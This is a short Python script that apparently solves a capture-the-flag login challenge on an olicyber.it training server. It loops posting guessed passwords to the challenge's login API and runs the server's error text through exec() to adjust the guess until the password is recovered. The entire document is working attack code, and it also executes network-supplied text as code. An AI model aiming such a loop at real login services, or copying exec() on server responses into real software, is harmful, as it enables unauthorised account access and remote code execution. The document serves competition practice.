#!/usr/bin/env python3
import requests
password = ['a' for _ in range(50)]

while True:
    r = requests.post("http://password-login.challs.nazionale.olicyber.it/api/login", json={"password": ''.join(password)})
    c = r.json()["error"].replace("!", "")
    exec(c)
    print(''.join(password))
